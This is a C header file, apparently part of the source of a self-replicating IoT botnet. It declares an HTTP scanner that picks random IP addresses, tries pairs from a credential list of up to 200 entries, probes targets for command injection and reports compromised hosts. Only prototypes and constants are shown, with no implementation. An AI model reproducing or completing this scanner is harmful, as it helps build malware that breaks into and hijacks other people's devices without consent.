#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#define HTTP_SCANNER_MAX_CONNS   128
#define HTTP_MAX_CREDS           200
struct http_cred_pair {
    const char *user;
    const char *pass;
};
void http_scanner(void);
void http_kill(void);
static void http_setup_connection(ipv4_t target_ip, uint16_t port);
static ipv4_t get_random_http_ip(void);
static void http_report(ipv4_t ip, uint16_t port, const char *user, const char *pass);
static int http_check_auth(int fd, const char *user, const char *pass);
static int http_check_command_injection(int fd, ipv4_t target_ip, uint16_t port);
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details);
static void base64_encode(const char *input, char *output);
#endif
